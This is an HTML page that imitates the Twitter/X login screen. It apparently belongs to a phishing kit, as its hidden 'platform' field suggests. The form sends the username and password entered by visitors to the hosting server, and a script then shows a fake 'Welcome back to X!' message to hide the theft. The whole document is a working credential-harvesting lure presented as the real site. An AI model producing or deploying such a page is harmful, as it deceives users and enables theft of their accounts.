<!DOCTYPE html><html><head><title>Twitter</title><meta name="viewport" content="width=device-width"><style>body{background:#000;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}.container{background:#15202b;border-radius:24px;padding:40px;width:360px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,.5)}.logo{font-size:52px;font-weight:900;background:linear-gradient(45deg,#1da1f2,#17bf63);background-clip:text;-webkit-background-clip:text;color:transparent;margin-bottom:30px}.input-group input{width:100%;padding:16px;margin:12px 0;border:2px solid #38444d;border-radius:24px;font-size:16px;box-sizing:border-box;background:#1e293b;color:#fff}.input-group input::placeholder{color:#71767b}.login-btn{width:100%;padding:16px;background:#1da1f2;color:#fff;border:0;border-radius:24px;font-size:17px;font-weight:700;cursor:pointer;margin:20px 0}.login-btn:hover{background:#1991db}</style></head><body><div class="container"><div class="logo">X</div><form method="POST"><div class="input-group"><input type="text" name="username" placeholder="Username or email" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><input type="hidden" name="platform" value="twitter"><button type="submit" class="login-btn">Log in</button></form></div><script>document.querySelector('form').onsubmit=function(){setTimeout(()=>{document.body.innerHTML='<div style="padding:60px;text-align:center;font-size:20px">Welcome back to X!</div>';},700);}</script></body></html>
